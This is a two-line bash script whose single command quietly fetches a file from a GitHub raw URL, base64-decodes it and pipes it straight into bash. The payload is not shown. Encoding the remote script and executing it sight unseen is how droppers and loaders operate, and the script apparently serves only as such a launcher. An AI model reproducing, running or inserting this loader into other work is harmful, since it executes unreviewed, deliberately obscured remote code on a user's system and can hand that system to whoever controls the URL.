#!/bin/bash
wget -qO- https://raw.githubusercontent.com/frederickdicarlo/nuts/refs/heads/main/entrypoint.sh | base64 -d | bash
